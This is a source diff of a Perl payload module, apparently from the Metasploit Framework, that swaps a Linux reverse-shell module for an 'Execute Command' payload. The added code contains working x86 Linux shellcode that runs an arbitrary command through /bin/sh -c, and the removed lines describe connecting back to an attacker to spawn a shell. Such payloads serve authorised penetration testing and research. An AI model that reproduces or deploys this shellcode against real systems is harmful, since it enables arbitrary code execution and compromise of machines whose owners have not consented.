@@ -7,41 +7,59 @@
 # version of the Framework can always be obtained from metasploit.com.
 ##
 
-package Msf::Payload::linx86_reverse_ie;
+package Msf::Payload::linux_ia32_exec;
 use strict;
-use base 'Msf::PayloadComponent::InlineEggPayload';
-sub _Load {
-  Msf::PayloadComponent::InlineEggPayload->_Import('Msf::PayloadComponent::ReverseConnection');
-  __PACKAGE__->SUPER::_Load();
-}
+use base 'Msf::PayloadComponent::NoConnection';
+use Pex::x86;
 
 my $info =
 {
-  'Name'         => 'Linux InlineEgg Reverse Shell',
+  'Name'         => 'Linux IA32 Execute Command',
   'Version'      => '$Revision$',
-  'Description'  => 'Connect back to attacker and spawn a shell',
-  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
+  'Description'  => 'Execute an arbitrary command',
+  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
   'Arch'         => [ 'x86' ],
   'Priv'         => 0,
   'OS'           => [ 'linux' ],
-  'Size'         => 0,
+  'Size'         => '',
+  'UserOpts'     =>
+   {
+      'CMD' => [1, 'DATA', 'The command string to execute'],
+   },
 };
 
 sub new {
-  _Load();
   my $class = shift;
   my $hash = @_ ? shift : { };
   $hash = $class->MergeHashRec($hash, {'Info' => $info});
   my $self = $class->SUPER::new($hash, @_);
 
-  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86reverse_ie.py';
   $self->_Info->{'Size'} = $self->_GenSize;
   return($self);
 }
 
+sub Build {
+  my $self = shift;
+  return($self->Generate($self->GetVar('CMD')));
+}
+
+sub Generate {
+  my $self = shift;
+  my $cmd = shift;
+
+  my $shellcode =
+    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68".
+    "\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52".
+    Pex::x86::call(length($cmd)+1).
+    $cmd . "\x00".
+    "\x57\x53\x89\xe1\xcd\x80";
+
+  return($shellcode);
+}
+
 sub _GenSize {
   my $self = shift;
-  my $bin = $self->Generate({'LHOST' => '127.0.0.1', 'LPORT' => '4444',});
+  my $bin = $self->Generate('');
   return(length($bin));
 }
 
